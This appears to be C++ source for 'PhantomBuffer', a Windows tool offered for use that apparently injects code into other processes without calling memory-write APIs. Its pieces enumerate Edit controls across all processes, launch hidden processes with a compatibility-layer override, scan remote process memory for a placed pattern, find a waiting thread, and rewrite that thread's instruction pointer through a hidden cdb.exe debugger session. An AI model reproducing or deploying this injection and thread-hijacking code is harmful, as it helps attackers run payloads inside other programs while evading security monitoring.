#include <windows.h>
#include <iostream>
#include <string>
#include "ProcessHelper.h"

bool IsStandardEditControl(const wchar_t* className) {
    if (className == nullptr) return false;
    return (_wcsicmp(className, L"Edit") == 0);
}

// Helper to get the process executable name from an HWND
std::wstring GetProcessNameAndPid(HWND hwnd, DWORD& outPid) {
    outPid = 0;
    GetWindowThreadProcessId(hwnd, &outPid);

    if (outPid == 0) return L"Unknown Process";

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, outPid);
    if (hProcess) {
        wchar_t buffer[MAX_PATH] = { 0 };
        DWORD size = _countof(buffer);

        if (QueryFullProcessImageNameW(hProcess, 0, buffer, &size)) {
            std::wstring fullPath(buffer);
            size_t lastSlash = fullPath.find_last_of(L"\\/");
            CloseHandle(hProcess);
            if (lastSlash != std::wstring::npos) {
                return fullPath.substr(lastSlash + 1);
            }
            return fullPath;
        }
        CloseHandle(hProcess);
    }
    return L"System/Protected Process";
}

// Function that handles verifying, printing, and optionally modifying the Edit control
void InspectAndModifyControl(HWND hwnd, HWND topLevelParent) {
    wchar_t className[256] = { 0 };

    if (GetClassNameW(hwnd, className, _countof(className))) {
        // Filter strictly for standard "Edit" controls
        if (IsStandardEditControl(className)) {
            DWORD pid = 0;
            std::wstring processName = GetProcessNameAndPid(topLevelParent, pid);

            wchar_t parentTitle[256] = L"Untitled Window";
            GetWindowTextW(topLevelParent, parentTitle, _countof(parentTitle));

            wchar_t controlText[512] = L"";
            GetWindowTextW(hwnd, controlText, _countof(controlText));

            std::wcout << L"Process: " << processName << L" (PID: " << pid << L")\n"
                << L"Window Title: \"" << parentTitle << L"\"\n"
                << L"  -> Standard Edit HWND: " << hwnd
                << L" | Current Text: \"" << controlText << L"\"\n";

            std::wcout << L"--------------------------------------------------" << std::endl;
        }
    }
}

// Callback for EnumChildWindows (looks inside top-level windows)
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    HWND topLevelParent = (HWND)lParam;
    InspectAndModifyControl(hwnd, topLevelParent);
    return TRUE;
}

// Callback for EnumWindows (loops through all top-level windows)
BOOL CALLBACK EnumTopLevelWindowsProc(HWND hwnd, LPARAM lParam) {
    // 1. Check if the top-level window itself is a naked Edit control
    InspectAndModifyControl(hwnd, hwnd);

    // 2. Drill down into child elements
    EnumChildWindows(hwnd, EnumChildProc, (LPARAM)hwnd);

    return TRUE;
}

int wmain(int argc, wchar_t* argv[])
{
    //Running as normal application
    std::wcout << L"\nPhantomBuffer: Send buffers without Writing\n"
        << L"\nGitHub:  https://github.com/TwoSevenOneT/PhantomBuffer\n"
        << L"\nTwo Seven One Three: https://x.com/TwoSevenOneT\n"
        << L"\n==========================================================\n\n";


    if (argc < 2)
    {
        std::wcerr << L"For Enum:\n";
        std::wcerr << L"Usage: PhantomBuffer\\" << argv[0] << L" -list\n";
        std::wcerr << L"For spawn new:\n";
        std::wcerr << L"Usage: PhantomBuffer\\" << argv[0] << L" <FilePath>\n";
        return 1;
    }


    std::wstring input = argv[1];
    if (input == L"-list") {
        std::wcout << L"Scanning system strictly for visible, standard [Edit] controls...\n" << std::endl;
        EnumWindows(EnumTopLevelWindowsProc, 0);
        std::wcout << L"\nScan complete." << std::endl;
    }
    else {
        StartTarget(input);
    }

    return 0;
}

#pragma once
#include <windows.h>
#include <iostream>
#include <vector>

BOOL StartTarget(std::wstring commandStr) {

    LPWCH pCurrentEnv = GetEnvironmentStringsW();
    if (!pCurrentEnv) return false;

    // 2. Copy existing environment variables into a vector
    std::vector<wchar_t> newEnv;
    LPWCH pVar = pCurrentEnv;
    while (*pVar) {
        size_t len = wcslen(pVar) + 1;
        newEnv.insert(newEnv.end(), pVar, pVar + len);
        pVar += len;
    }
    FreeEnvironmentStringsW(pCurrentEnv); // Free the original block

    // 3. Append our override variable: "__COMPAT_LAYER=RunAsInvoker\0"
    const wchar_t* compatLayer = L"__COMPAT_LAYER=RunAsInvoker";
    size_t compatLen = wcslen(compatLayer) + 1;
    newEnv.insert(newEnv.end(), compatLayer, compatLayer + compatLen);

    // 4. Append the final null terminator to mark the end of the block
    newEnv.push_back(L'\0');

    // Convert to a vector to ensure a mutable, null-terminated wchar_t array
    std::vector<wchar_t> cmdLineBuffer(commandStr.begin(), commandStr.end());
    cmdLineBuffer.push_back(L'\0'); // Explicitly append null-terminator

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // 4. Configure the STARTUPINFO structure to hide the window
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    std::wcout << L"Launching hidden process: " << commandStr << std::endl;

    // 5. Call CreateProcessW using the mutable buffer pointer
    BOOL success = CreateProcessW(
        NULL,                   // No module name (use command line)
        cmdLineBuffer.data(),   // Pointer to mutable wide string buffer
        NULL,                   // Process handle not inheritable
        NULL,                   // Thread handle not inheritable
        FALSE,                  // Set handle inheritance to FALSE
        CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT,       // Process creation flags (for console applications)
        newEnv.data(),                   // Use parent's environment block
        NULL,                   // Use parent's starting directory 
        &si,                    // Pointer to STARTUPINFO structure
        &pi                     // Pointer to PROCESS_INFORMATION structure
    );

    if (!success) {
        std::cerr << "CreateProcess failed. Error code: " << GetLastError() << std::endl;
        return FALSE;
    }
    std::wcout << L"Process created successfully! ID: " << pi.dwProcessId << std::endl;
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return TRUE;
}

#pragma once
#include <windows.h>
#include <winternl.h>

std::optional<uintptr_t> FindPatternInRemoteProcess(
    HANDLE hProcess,
    const std::vector<uint8_t>& pattern)
{
    if (pattern.empty())
        return std::nullopt;

    SYSTEM_INFO sysInfo{};
    GetNativeSystemInfo(&sysInfo);

    const uintptr_t minAddr = reinterpret_cast<uintptr_t>(sysInfo.lpMinimumApplicationAddress);
    const uintptr_t maxAddr = reinterpret_cast<uintptr_t>(sysInfo.lpMaximumApplicationAddress);
    const size_t patternSize = pattern.size();

    constexpr size_t CHUNK_SIZE = 1 * 1024 * 1024; // 1 MB
    std::vector<uint8_t> buffer;
    buffer.reserve(CHUNK_SIZE + patternSize);

    uintptr_t address = minAddr;
    MEMORY_BASIC_INFORMATION mbi{};

    while (address < maxAddr) {
        if (VirtualQueryEx(hProcess, reinterpret_cast<LPCVOID>(address),
            &mbi, sizeof(mbi)) == 0) {
            address += sysInfo.dwPageSize;
            continue;
        }

        const uintptr_t regionBase = reinterpret_cast<uintptr_t>(mbi.BaseAddress);
        const uintptr_t regionEnd = regionBase + mbi.RegionSize;

        const bool isPrivate = (mbi.Type == MEM_PRIVATE);
        const bool isCommitted = (mbi.State == MEM_COMMIT);
        const bool isReadable = (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE |
            PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE |
            PAGE_WRITECOPY | PAGE_EXECUTE_WRITECOPY)) != 0;
        const bool isGuarded = (mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS)) != 0;

        if (isPrivate && isCommitted && isReadable && !isGuarded &&
            mbi.RegionSize >= patternSize) {

            uintptr_t chunkAddr = regionBase;
            size_t carry = 0; // bytes carried from previous chunk for boundary matches

            while (chunkAddr < regionEnd) {
                const size_t toRead = static_cast<size_t>(
                    std::min<size_t>(CHUNK_SIZE, regionEnd - chunkAddr));

                buffer.resize(carry + toRead);
                SIZE_T bytesRead = 0;

                if (!ReadProcessMemory(hProcess,
                    reinterpret_cast<LPCVOID>(chunkAddr),
                    buffer.data() + carry,
                    toRead,
                    &bytesRead) || bytesRead == 0) {
                    // If a chunk fails, skip the rest of this region.
                    // You could fall back to page-by-page reads here if needed.
                    break;
                }

                const size_t total = carry + bytesRead;

                if (total >= patternSize) {
                    const size_t limit = total - patternSize;
                    for (size_t i = 0; i <= limit; ++i) {
                        if (memcmp(buffer.data() + i, pattern.data(), patternSize) == 0) {
                            // buffer[i] corresponds to this remote address:
                            return chunkAddr - carry + i;
                        }
                    }
                }

                // Keep the last patternSize-1 bytes for the next chunk.
                carry = (patternSize > 1) ? (std::min)(patternSize - 1, total) : 0;
                if (carry > 0) {
                    memmove(buffer.data(), buffer.data() + total - carry, carry);
                }

                chunkAddr += bytesRead;
            }
        }

        address = regionEnd;
    }

    return std::nullopt;
}

// ---------------------------------------------------------------------------
// Minimal base64 decoder.
// Ignores whitespace / newlines. Returns empty vector on malformed input.
// ---------------------------------------------------------------------------
static std::vector<uint8_t> Base64Decode(const std::string& in)
{
    auto val = [](char c) -> int {
        if (c >= 'A' && c <= 'Z') return c - 'A';
        if (c >= 'a' && c <= 'z') return c - 'a' + 26;
        if (c >= '0' && c <= '9') return c - '0' + 52;
        if (c == '+') return 62;
        if (c == '/') return 63;
        return -1;   // padding or invalid
        };

    std::vector<uint8_t> out;
    out.reserve(in.size() * 3 / 4 + 3);

    int      buf = 0;
    int      bits = 0;

    for (char c : in) {
        if (c == '=') break;                 // padding → done
        if (c == '\r' || c == '\n' || c == ' ' || c == '\t') continue;

        int v = val(c);
        if (v < 0) {                          // invalid char
            std::fwprintf(stderr, L"[!] Invalid base64 character: '%c' (0x%02X)\n",
                (wint_t)c, (unsigned char)c);
            return {};
        }

        buf = (buf << 6) | v;
        bits += 6;

        if (bits >= 8) {
            bits -= 8;
            out.push_back(static_cast<uint8_t>((buf >> bits) & 0xFF));
        }
    }
    return out;
}

static DWORD GetMainThreadId02(DWORD pid)
{
    static pNtQuerySystemInformation NtQuerySystemInformation =
        reinterpret_cast<pNtQuerySystemInformation>(
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"),
                "NtQuerySystemInformation"));

    if (!NtQuerySystemInformation) {
        std::fwprintf(stderr, L"Failed to resolve NtQuerySystemInformation.\n");
        return 0;
    }

    ULONG size = 1 << 20;
    std::vector<BYTE> buffer(size);
    NTSTATUS status;
    for (;;) {
        status = NtQuerySystemInformation(
            SystemProcessInformation, buffer.data(),
            static_cast<ULONG>(buffer.size()), &size);
        if (status == static_cast<NTSTATUS>(0xC0000004L)) { // STATUS_INFO_LENGTH_MISMATCH
            buffer.resize(buffer.size() * 2);
            continue;
        }
        break;
    }

    if (status != 0) {
        std::fwprintf(stderr, L"NtQuerySystemInformation failed. status = 0x%08X\n",
            static_cast<unsigned>(status));
        return 0;
    }

    BYTE* ptr = buffer.data();
    for (;;) {
        auto* spi = reinterpret_cast<MSYSTEM_PROCESS_INFORMATION*>(ptr);

        if (static_cast<DWORD>(reinterpret_cast<ULONG_PTR>(spi->UniqueProcessId)) == pid) {
            for (ULONG i = 0; i < spi->NumberOfThreads; ++i) {
                const auto& t = spi->Threads[i];
                if (t.ThreadState == ThreadStateWaiting &&
                    t.WaitReason == WaitReasonWrQueue)
                {
                    return static_cast<DWORD>(
                        reinterpret_cast<ULONG_PTR>(t.ClientId.UniqueThread));
                }
            }
            return 0;
        }

        if (spi->NextEntryOffset == 0)
            break;
        ptr += spi->NextEntryOffset;
    }

    return 0;
}

#pragma once
#include <windows.h>
#include <string>
#include <cstdio>

// Runs cdb.exe to attach to a process, change a thread's RIP, and detach.
// cdbPath  : Full path to portable cdb.exe
// pid      : Target process ID (decimal)
// tid      : Target thread ID (system TID, will be converted to hex for ~~[])
// newRip   : New instruction pointer value
// timeoutMs: Optional timeout (0 = wait indefinitely)
bool ChangeThreadRipViaCdb(
    const std::wstring& cdbPath,
    DWORD pid,
    DWORD tid,
    ULONG64 newRip,
    DWORD timeoutMs = 30000)
{
    // Build the -c script. TID must be hex without 0x prefix.
    wchar_t script[512];
    swprintf_s(script, L"~~[%x]s; r rip=0x%llX; qd",
        tid, (unsigned long long)newRip);

    // Build the full command line.
    wchar_t cmdLine[1024];
    swprintf_s(cmdLine, L"\"%s\" -p %u -c \"%s\"",
        cdbPath.c_str(), pid, script);

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // no console window flash

    PROCESS_INFORMATION pi = {};

    // CREATE_NO_WINDOW prevents a console from appearing.
    BOOL ok = CreateProcessW(
        nullptr,
        cmdLine,
        nullptr, nullptr,
        FALSE,
        CREATE_NO_WINDOW,
        nullptr, nullptr,
        &si, &pi);

    if (!ok) {
        wprintf(L"[!] CreateProcess failed. Error = %lu\n", GetLastError());
        return false;
    }

    // Wait for cdb.exe to finish (with optional timeout).
    DWORD waitResult = WaitForSingleObject(pi.hProcess, timeoutMs ? timeoutMs : INFINITE);

    if (waitResult == WAIT_TIMEOUT) {
        wprintf(L"[!] cdb.exe timed out. Terminating.\n");
        TerminateProcess(pi.hProcess, 1);
    }

    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    wprintf(L"[*] cdb.exe exited with code %lu\n", exitCode);
    return (waitResult == WAIT_OBJECT_0);
}
